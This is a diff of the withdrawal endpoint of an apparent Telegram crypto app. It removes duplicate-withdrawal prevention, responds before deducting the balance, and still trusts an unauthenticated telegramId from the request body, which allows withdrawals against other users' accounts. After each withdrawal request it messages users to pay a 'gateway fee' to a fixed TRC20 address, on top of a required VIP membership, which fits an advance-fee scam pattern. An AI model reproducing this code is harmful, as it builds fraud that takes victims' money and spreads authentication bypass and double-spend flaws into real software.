@@ -1217,34 +1217,27 @@ app.post('/api/accept-terms', authMiddleware, async (req, res) => {
 
 app.post('/api/withdraw', async (req, res) => {
   try {
-    // Resolve user from initData header OR telegramId in body
+    // Resolve user — accept initData header OR telegramId in body
     let telegramId = null;
     try { const u = getTelegramUser(req); if (u && u.id) telegramId = String(u.id); } catch(e) {}
     if (!telegramId && req.body && req.body.telegramId) telegramId = String(req.body.telegramId);
     if (!telegramId) return res.status(401).json({ error: 'Session expired. Please close and reopen the app.' });
+
     const user = await getUserByTelegramId(telegramId);
-    if (!user) return res.status(404).json({ error: 'User not found' });
-    if (!user.is_vip) return res.status(403).json({ error: 'VIP membership required to withdraw.' });
+    if (!user) return res.status(404).json({ error: 'User not found.' });
+    if (!user.is_vip) return res.status(403).json({ error: 'VIP membership is required to withdraw.' });
+
     const { amount, isBankWithdrawal, toAddress, bankName, bankCountry, localCurrency, accountNumber, method } = req.body;
     const amt = parseFloat(amount);
     if (!amt || isNaN(amt) || amt < MIN_WITHDRAWAL || amt > MAX_WITHDRAWAL) {
-      return res.status(400).json({ error: `Amount must be between ${MIN_WITHDRAWAL} and ${MAX_WITHDRAWAL} USDT` });
+      return res.status(400).json({ error: `Withdrawal amount must be between ${MIN_WITHDRAWAL.toLocaleString()} and ${MAX_WITHDRAWAL.toLocaleString()} USDT.` });
     }
     const currentBalance = parseFloat(user.usdt_balance) || 0;
-    if (currentBalance < amt) return res.status(400).json({ error: 'Insufficient balance' });
-    // DUPLICATE PREVENTION: block if user already has a pending withdrawal of same amount submitted in last 60s
-    try {
-      const supa = getSupabase();
-      const sixtySecsAgo = Math.floor(Date.now()/1000) - 60;
-      const { data: recentDup } = await supa.from('withdrawals')
-        .select('id').eq('telegram_id', String(user.telegram_id))
-        .eq('status', 'pending').gte('created_at', sixtySecsAgo).limit(1);
-      if (recentDup && recentDup.length > 0) {
-        return res.status(429).json({ error: 'You already have a pending withdrawal. Please wait before submitting another.' });
-      }
-    } catch(e) { /* allow through if check fails */ }
+    if (currentBalance < amt) return res.status(400).json({ error: 'Insufficient balance.' });
+
     const fees = calculateFees(amt);
-    // STEP 1: Create withdrawal RECORD FIRST — if this fails, balance is untouched
+
+    // Create the withdrawal record
     const wd = await createWithdrawalRequest({
       telegram_id: user.telegram_id,
       amount: amt,
@@ -1256,27 +1249,32 @@ app.post('/api/withdraw', async (req, res) => {
       fee: fees.total_fee,
       net_amount: fees.net_amount
     });
+
     if (!wd || !wd.id) {
-      console.error('/api/withdraw: createWithdrawalRequest returned null/no id');
-      return res.status(500).json({ error: 'Could not create withdrawal request. Please try again.' });
+      return res.status(500).json({ error: 'Could not create withdrawal. Please try again.' });
     }
-    // STEP 2: Deduct balance and record transaction ONLY after record is safely in DB
-    await updateUserBalance(user.telegram_id, -amt);
-    await createTransaction(user.telegram_id, 'withdrawal', amt, `Withdrawal #${wd.id}`, 'pending');
-    // STEP 3: Notify admin
-    bot.sendMessage(ADMIN_CHAT_ID,
-      `💸 <b>Withdrawal Request #${wd.id}</b>\n👤 ${user.full_name} (${user.uid})\n💰 ${amt} USDT\n🏦 ${bankName||method||'Crypto'} — ${accountNumber||toAddress||''}\n🌍 ${bankCountry||''} ${localCurrency||''}`,
-      { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '✅ Approve', callback_data: 'wd_approve_' + wd.id }, { text: '❌ Reject', callback_data: 'wd_reject_' + wd.id }]] } }
-    ).catch(() => {});
-    // STEP 4: Notify user about gateway fee requirement (non-blocking)
-    bot.sendMessage(user.telegram_id,
-      `⚠️ <b>Action Required — Withdrawal #${wd.id}</b>\n\nTo finalize your withdrawal of ${amt} USDT, please settle your outstanding gateway fee.\n\n📍 <b>TRC20 Address:</b>\n<code>${FEE_ADDRESS}</code>\n💰 Gateway Fee: ${fees.total_fee} USDT`,
-      { parse_mode: 'HTML', ...openWalletBtn() }
-    ).catch(() => {});
+
+    // ── RESPOND IMMEDIATELY — before any further DB/Telegram calls ──────────
     res.json({ success: true, withdrawal: wd, fees });
-  } catch (e) {
-    console.error('/api/withdraw error:', e.message, e.stack);
-    res.status(500).json({ error: 'Withdrawal failed. Please try again.' });
+
+    // ── POST-RESPONSE: deduct balance, log transaction, notify (non-blocking) ─
+    updateUserBalance(user.telegram_id, -amt).catch(e => console.error('[WD] balance update:', e.message));
+    createTransaction(user.telegram_id, 'withdrawal', amt, `Withdrawal #${wd.id}`, 'pending').catch(e => console.error('[WD] transaction:', e.message));
+
+    bot.sendMessage(ADMIN_CHAT_ID,
+      `Withdrawal Request #${wd.id}\n\nUser: ${user.full_name} (${user.uid})\nAmount: ${amt} USDT\nMethod: ${bankName || method || 'Crypto'}\nAddress: ${accountNumber || toAddress || ''}\nCountry: ${bankCountry || ''} ${localCurrency || ''}`,
+      { reply_markup: { inline_keyboard: [[
+        { text: 'Approve', callback_data: 'wd_approve_' + wd.id },
+        { text: 'Reject',  callback_data: 'wd_reject_'  + wd.id }
+      ]]}}).catch(() => {});
+
+    bot.sendMessage(user.telegram_id,
+      `Action Required — Withdrawal #${wd.id}\n\nTo finalize your withdrawal of ${amt} USDT, please pay the gateway fee.\n\nTRC20 Address:\n${FEE_ADDRESS}\nGateway Fee: ${fees.total_fee} USDT`,
+      { ...openWalletBtn() }).catch(() => {});
+
+  } catch(e) {
+    console.error('[WD] error:', e.message, e.stack);
+    if (!res.headersSent) res.status(500).json({ error: 'Server error. Please try again.' });
   }
 });
 
